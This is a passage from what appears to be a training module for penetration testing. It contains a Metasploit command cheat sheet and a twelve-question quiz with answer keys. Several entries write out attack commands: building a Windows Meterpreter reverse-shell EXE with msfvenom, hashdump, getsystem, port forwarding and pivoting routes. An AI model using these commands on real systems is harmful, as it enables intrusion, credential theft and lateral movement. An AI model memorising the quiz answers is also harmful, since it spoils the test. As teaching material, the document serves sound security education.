      <tr><td>Set target</td><td><code>set RHOSTS [ip]</code></td></tr>
      <tr><td>Set your IP</td><td><code>set LHOST [ip]</code></td></tr>
      <tr><td>Run exploit</td><td><code>run</code> or <code>exploit</code></td></tr>
      <tr><td>Background session</td><td><code>Ctrl+Z</code> or <code>background</code></td></tr>
      <tr><td>List sessions</td><td><code>sessions -l</code></td></tr>
      <tr><td>Interact with session</td><td><code>sessions -i [id]</code></td></tr>
      <tr><td>Generate payload</td><td><code>msfvenom -p [payload] LHOST=x LPORT=y -f [format] -o [file]</code></td></tr>
      <tr><td>Set up listener</td><td><code>use exploit/multi/handler</code></td></tr>
      <tr><td>Escalate to SYSTEM</td><td><code>getsystem</code> (in Meterpreter)</td></tr>
      <tr><td>Dump hashes</td><td><code>hashdump</code> (in Meterpreter)</td></tr>
      <tr><td>Port forward</td><td><code>portfwd add -l [lport] -p [rport] -r [target]</code></td></tr>
      <tr><td>Add route (pivot)</td><td><code>route add [subnet] [session_id]</code></td></tr>
    </tbody>
  </table>

  <!-- ==================== QUIZ SECTION ==================== -->
  <div class="section-complete">
    <div class="check">🎯</div>
    <h2>Ready to Test Your Knowledge?</h2>
    <p style="color: var(--text-dim); margin-bottom: 8px;">12 questions covering MSF commands, payloads, Meterpreter, and exploit workflows. Score 70%+ to earn full XP.</p>
    <button class="btn-primary quiz-start-btn" id="start-quiz-btn">Start Field Test</button>
    <br><br>
    <button class="btn-secondary" id="complete-topic-btn">Mark as Complete (Skip Quiz)</button>
  </div>

</article>
  `;
}

// ==================== QUIZ DATA ====================
export const quiz = [
  {
    type: 'mcq',
    question: 'What is the difference between an auxiliary module and an exploit module in Metasploit?',
    options: [
      'Auxiliary modules are newer than exploit modules',
      'Auxiliary modules gather information and scan but do NOT deliver a payload; exploit modules compromise a target',
      'Auxiliary modules only work on Linux; exploit modules work on Windows',
      'There is no difference — they are interchangeable terms'
    ],
    correct: 1,
    explanation: 'Auxiliary modules handle scanning, enumeration, fuzzing, and brute-forcing — they never deliver a payload. Exploit modules actively take advantage of a vulnerability to gain access and can deliver payloads like Meterpreter.'
  },
  {
    type: 'type-command',
    question: 'You want to generate a Windows Meterpreter reverse TCP payload as an EXE file with LHOST=10.10.14.2 and LPORT=4444. Write the msfvenom command:',
    scenario: 'Generate a malicious EXE that calls back to your machine.',
    validAnswers: [
      'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > shell.exe',
      'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe',
    ],
    hint: 'msfvenom -p [payload] LHOST=... LPORT=... -f [format] > [filename]',
    explanation: 'msfvenom -p sets the payload, LHOST/LPORT configure the callback, -f exe sets the output format, and > or -o writes the file.'
  },
  {
    type: 'mcq',
    question: 'You see the payload name "windows/shell_reverse_tcp" (single slash). What type of payload is this?',
    options: [
      'Staged payload — stager downloads the stage',
      'Single (inline) payload — self-contained in one shot',
      'Encoder payload — obfuscated for AV evasion',
      'Post-exploitation payload'
    ],
    correct: 1,
    explanation: 'A single slash in the payload name (e.g., windows/shell_reverse_tcp) indicates a single/inline payload. It is self-contained. Staged payloads have two slashes (e.g., windows/meterpreter/reverse_tcp).'
  },
  {
    type: 'drag-match',
    question: 'Match each Meterpreter command to its function:',
    pairs: [
      { label: 'hashdump', value: 'Dump password hashes' },
      { label: 'migrate', value: 'Move to another process' },
      { label: 'portfwd', value: 'Port forwarding' },
      { label: 'getsystem', value: 'Escalate to SYSTEM' },
      { label: 'sysinfo', value: 'Show OS and hostname' },
    ]
  },
  {
    type: 'mcq',
    question: 'You generated a payload with "msfvenom -p windows/meterpreter/reverse_tcp" but set the multi/handler payload to "windows/shell/reverse_tcp". What happens?',
    options: [
      'It works fine — Metasploit auto-detects the payload',
      'The connection will fail because the payload types don\'t match',
      'You get a Meterpreter session anyway',
      'The handler automatically upgrades the shell'
    ],
    correct: 1,
    explanation: 'The payload in multi/handler MUST match the payload used in msfvenom exactly. A mismatch means the stager and stage won\'t align, and the connection fails silently.'
  },
  {
    type: 'mcq',
    question: 'Why would you prefer a reverse shell over a bind shell?',
    options: [
      'Reverse shells are encrypted, bind shells are not',
      'Reverse shells are faster',
      'Reverse shells bypass firewalls that block inbound connections but allow outbound',
      'Bind shells only work on Linux'
    ],
    correct: 2,
    explanation: 'Firewalls typically block inbound connections but allow outbound. A reverse shell makes the target connect OUT to your machine, bypassing inbound firewall rules. A bind shell opens a port on the target, which a firewall would likely block.'
  },
  {
    type: 'type-command',
    question: 'You\'re in msfconsole and want to search for all available EternalBlue exploit modules. Write the command:',
    scenario: 'Find EternalBlue modules in Metasploit.',
    validAnswers: [
      'search eternalblue',
      'search ms17_010',
      'search ms17-010',
      'search type:exploit eternalblue',
    ],
    hint: 'search [keyword]',
    explanation: 'The search command in msfconsole searches module names, descriptions, and CVE references. "search eternalblue" or "search ms17_010" will find all EternalBlue-related modules.'
  },
  {
    type: 'mcq',
    question: 'What does the Meterpreter "migrate" command do, and why is it useful?',
    options: [
      'Moves the Meterpreter session to another target machine',
      'Moves the Meterpreter agent into a different process on the same machine for stability or privilege inheritance',
      'Migrates the exploit to a different operating system',
      'Transfers files between the attacker and target'
    ],
    correct: 1,
    explanation: 'migrate moves your Meterpreter session into another running process. This gives you stability (the original process might be killed) and lets you inherit the target process\'s privileges — migrate to a SYSTEM process to get SYSTEM access.'
  },
  {
    type: 'mcq',
    question: 'You have a Meterpreter session on Machine A (10.10.10.5). Machine B (10.10.20.8) is only reachable from Machine A. How do you scan Machine B from Metasploit?',
    options: [
      'Just set RHOSTS to 10.10.20.8 — Metasploit will figure it out',
      'Use the route command to add 10.10.20.0/24 through your Meterpreter session, then run modules against Machine B',
      'You can\'t — Machine B is unreachable',
      'Restart msfconsole on Machine A'
    ],
    correct: 1,
    explanation: 'Use "route add 10.10.20.0/24 [session_id]" to route traffic to Machine B\'s subnet through your Meterpreter session on Machine A. This is called pivoting — one of the most important skills tested on the eJPT.'
  },
  {
    type: 'type-command',
    question: 'You have a basic command shell (session 2) and want to upgrade it to a full Meterpreter session. Which post module do you use?',
    scenario: 'Upgrade a dumb shell to Meterpreter.',
    validAnswers: [
      'use post/multi/manage/shell_to_meterpreter',
      'post/multi/manage/shell_to_meterpreter',
    ],
    hint: 'post/multi/manage/...',
    explanation: 'post/multi/manage/shell_to_meterpreter upgrades a basic command shell session to a full Meterpreter session, giving you access to all Meterpreter features like hashdump, migrate, and portfwd.'
  },
  {
    type: 'drag-match',
    question: 'Match each MSF module type to its description:',
    pairs: [
      { label: 'Exploits', value: 'Actively compromise a vulnerability' },
      { label: 'Auxiliary', value: 'Scan, enumerate, or brute-force' },
      { label: 'Payloads', value: 'Code that runs after exploitation' },
      { label: 'Encoders', value: 'Obfuscate payloads for evasion' },
      { label: 'Post', value: 'Run after gaining a session' },
    ]
  },
  {
    type: 'mcq',
    question: 'What command in msfconsole lets you run an Nmap scan AND automatically store the results in the Metasploit database?',
    options: [
      'nmap -sV [target]',
      'scan [target]',
      'db_nmap -sV [target]',
      'import nmap [target]'
    ],
    correct: 2,
    explanation: 'db_nmap runs Nmap from within msfconsole and automatically imports the results into the MSF database. You can then view discovered hosts with "hosts" and services with "services" — much more efficient than running Nmap separately.'
  },
];

// ==================== INTERACTIVES ====================
export function bindInteractives() {
  // No custom interactives for this module — try-it buttons and quiz
  // are handled by the global event system.
}
